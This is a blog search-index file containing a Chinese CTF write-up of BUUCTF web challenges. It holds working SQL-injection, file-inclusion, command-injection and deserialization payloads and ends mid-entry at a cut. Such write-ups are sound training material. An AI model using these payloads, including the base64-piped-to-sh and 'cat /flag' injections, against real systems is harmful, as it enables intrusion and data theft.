<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>WP - Buuctf Web Part</title>
      <link href="/2021/07/02/Buuctf/"/>
      <url>/2021/07/02/Buuctf/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>练习平台Buuctf</em></p><p><em>持续更新直到Web部分结束</em></p><p><em>笔记作者：outx</em></p><p><em>最后一次更新于2021-07-05</em></p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>]; <span class="comment">//白名单跟后续函数配合使用</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123; <span class="comment">//确定是否是字符串</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//提交的参数中是否在白名单</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr( <span class="comment">//过滤问号</span></span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//再次验证白名单</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);  <span class="comment">//将提交的参数进行url解码</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(  <span class="comment">//过滤问号</span></span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//再次验证白名单</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解题相关知识</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">**mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置</span><br><span class="line"><span class="comment">// mb_strpos (haystack ,needle )</span></span><br><span class="line"><span class="comment">// haystack：要被检查的字符串。</span></span><br><span class="line"><span class="comment">// needle：要搜索的字符串</span></span><br><span class="line">**mb_substr()** 函数返回字符串的一部分。</span><br><span class="line"><span class="comment">//str 必需。从该 string 中提取子字符串。</span></span><br><span class="line"><span class="comment">//start 必需。规定在字符串的何处开始。</span></span><br><span class="line"><span class="comment">//ength 可选。规定要返回的字符串长度。默认是直到字符串的结尾</span></span><br><span class="line">request()<span class="comment">//可以以get或者post提交参数</span></span><br><span class="line"><span class="keyword">include</span> <span class="comment">//文件包含</span></span><br><span class="line"><span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span><span class="comment">//将$_page后拼接.</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">&amp;&amp; <span class="title">emmm</span>::<span class="title">checkFile</span>(<span class="params"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function">上面这代码表示 将<span class="title">request</span>的<span class="title">file</span>值 传入$<span class="title">page</span>，其实就是将<span class="title">file</span>参数传入到<span class="title">page</span>中</span></span><br><span class="line"><span class="function">&amp;引用传递变量。这是通过在函数内建立一个本地变量并且该变量在呼叫范围内引用了同一个内容来实现的。例如：</span></span><br><span class="line"><span class="function">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">foo</span> (<span class="params">&amp;<span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123; <span class="variable">$var</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="number">5</span>;</span><br><span class="line">foo (<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">将使 <span class="variable">$a</span> 变成 <span class="number">6</span>。这是因为在 foo 函数中变量 <span class="variable">$var</span> 指向了和 <span class="variable">$a</span> 指向的同一个内容。</span><br></pre></td></tr></table></figure><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>过滤</p><p><code>select|update|delete|drop|insert|where</code></p><p>绕过，考虑报错注入</p><p><code>1&#39; and extractvalue(1,concat(&#39;~&#39;,database()))%23</code></p><p>但很多关键字被过滤，考虑堆叠注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27;;use supersqli;show tables;#</span></span><br><span class="line"><span class="string">-1&#x27;</span>;<span class="keyword">use</span> <span class="title">supersqli</span>;show columns <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="comment">#</span></span><br><span class="line">-<span class="number">1</span><span class="string">&#x27;;use supersqli;set @sql=concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect `flag` <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span></span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>核心思路</p><p><code>set sql_mode=pipes_as_concat;</code></p><p>Payload:</p><p><code>1;set sql_mode=pipes_as_concat;select 1</code></p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码</p><p><code>check.php?username=admin%27or+1%3D1+%23&amp;password=dawd</code></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>一路点，抓包在302页面找到secr3t.php，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用file=php://filter/convert.base64-encode/resource=flag.php来读就好</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=<span class="string">&quot;background-color:black;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=<span class="string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;我就在这里&quot;</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;56d32da4-1a02-4eb1-a01f-c140abc88a4b&#125;&#x27;</span>;</span><br><span class="line">                <span class="variable">$secret</span> = <span class="string">&#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=<span class="string">&quot;background-color:black;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=<span class="string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;我就在这里&quot;</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;56d32da4-1a02-4eb1-a01f-c140abc88a4b&#125;&#x27;</span>;</span><br><span class="line">                <span class="variable">$secret</span> = <span class="string">&#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>tornado的cookie_secret文档</p><p><a href="https://www.tornadoweb.org/en/latest/guide/security.html?highlight=cookie_secret">https://www.tornadoweb.org/en/latest/guide/security.html?highlight=cookie_secret</a></p><p>当MainHandler传递值时，会创建一个名叫settings的dict，而cookie_secret就在里面。并且，settings会随着MainHandler传递到前端去。即可以在handler.settings中找到cookie_secret的值，然后跟着它的hint做就可以了</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><code>php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>order%<span class="number">20</span>by%<span class="number">204</span>%<span class="number">23</span> 注出只有<span class="number">3</span>个字段</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span> 找到显位<span class="number">2</span>和<span class="number">3</span></span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,database(),<span class="number">3</span>%<span class="number">23</span> 数据库名geek</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>union%<span class="number">20</span>select%<span class="number">201</span>,(select%<span class="number">20</span>group_concat(table_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span>where%<span class="number">20</span>table_schema=%<span class="number">27</span>geek%<span class="number">27</span>),<span class="number">3</span>%<span class="number">23</span> 表名geekuser,l0ve1ysq1</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,(select%<span class="number">20</span>group_concat(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=%<span class="number">27</span>geek%<span class="number">27</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>table_name=%<span class="number">27</span>l0ve1ysq1%<span class="number">27</span>),<span class="number">3</span>%<span class="number">23</span> 字段名id,username,password</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,(select%<span class="number">20</span>group_concat(username,%<span class="number">200</span>x5e,%<span class="number">20</span>password)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>geek.l0ve1ysq1),<span class="number">3</span>%<span class="number">23</span> 获取字段内容，然后找到flag</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST会将某些字符删除或用下划线代替，如%20news[id%00=42会转换为Array([news_id] =&gt; 42)</p><p>过滤了&quot;&#39;，用chr()绕过%20num=var_dump(scandir(chr(47)))得到列表</p><p>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))得到flag</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>过滤空格绕过方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure><p>这题的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">22</span>|<span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh</span><br><span class="line">?ip=<span class="number">22</span>|ls|xargs$IFS$<span class="number">1</span>cat</span><br><span class="line">?ip=<span class="number">22</span>|cat$IFS$<span class="number">1</span>`ls`</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>POST：Syc=var_dump(file_get_contents(&#39;/flag&#39;));</p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>ss|cat /flag</p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>反序列化务必使用python来看，绕过__wakeup函数只用把表示属性个数的值改大就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://127.0.0.1/www/111.php&quot;</span>)</span><br><span class="line"><span class="keyword">print</span>(repr(resp.text))</span><br><span class="line"><span class="comment"># O:4:&quot;Name&quot;:2:&#123;s:14:&quot;\x00Name\x00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\x00Name\x00password&quot;;i:100;&#125;</span></span><br><span class="line">xx = <span class="string">&#x27;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;\x00Name\x00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\x00Name\x00password&quot;;i:100;&#125;&#x27;</span></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://96d1b3c9-16f6-44e8-a10e-bea5badd78c5.node3.buuoj.cn/?select=&quot;</span>+ xx)</span><br><span class="line"><span class="keyword">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>111.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//include &#x27;class.php&#x27;;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username </span>= <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password </span>= <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$aa </span>= <span class="keyword">new</span> Name(<span class="string">&quot;admin&quot;</span>, <span class="number">100</span>);</span><br><span class="line">print_r(serialize(<span class="variable">$aa</span>));</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /Secret.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node3.buuoj.cn:<span class="number">26611</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Syclover/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="comment">Referer: https://www.Sycsecret.com</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure><p>主要三个地方，一个Referer，一个XFF，一个改浏览器标识</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>做法1：Session伪造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span> 拿到secret_key</span><br></pre></td></tr></table></figure><p>利用github上一个开源项目伪造session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -s ckj123 -c <span 